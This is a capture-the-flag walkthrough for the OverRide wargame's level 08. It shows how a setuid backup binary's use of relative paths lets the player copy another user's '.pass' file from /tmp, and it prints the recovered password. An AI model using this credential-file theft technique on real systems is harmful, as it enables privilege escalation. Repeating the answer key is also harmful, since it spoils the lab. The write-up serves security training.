# Level 08

Once logged in, you will see a binary, AND a directory name `backups`

```
$ ssh localhost -p 4444 -l level08
	   ____                  ____  _     __
	  / __ \_   _____  _____/ __ \(_)___/ /__
	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
	/ /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
	\____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on localhost:4242
level08@localhost's password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
level08@OverRide:~$ ls
backups  level08
level08@OverRide:~$ ls -ls
total 16
 0 drwxrwx---+ 1 level09 users    60 Oct 19  2016 backups
16 -rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08
level08@OverRide:~$
```

Running the program, it asks to provide a filepath. A `.log` file is located in `backups` directory, so let's try giving the path, but it fails to open the file, and the prompt shows the path different from the one given.

```
level08@OverRide:~$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
level08@OverRide:~$ ./level08 ./backups/.log
ERROR: Failed to open ./backups/./backups/.log
level08@OverRide:~$
```

By decompiling the code, the program consists of 3 steps backing up the file given path.
1. The program attempts to open `./backups/.log` file for backup. If fails, the program will exit
  - The `log_wrapper` function will execute for logging the file
  - _Note: the path is not absolute, it's relative path._
2. The program will try opening the file from given path. If fails, the program will exit.
3. The program will copy the contents into the `./backups/[filename]`, and if it fails to create the file, the program will exit.
4. After the program finishes, the program will end.
  - the `log_wrapper` function will execute for logging the file

So the following would not be able to work, since there is no permission given to `level8` to open the file for `level9`.

```
level08@OverRide:~$ ./level08 /home/user/level9/.pass
ERROR: Failed to open /home/user/level9/.pass
level08@OverRide:~$
```

Since you cannot create any files in home directory (because of the permission), let's create a file on the directory `/tmp`.

```
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/
home/ .log
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
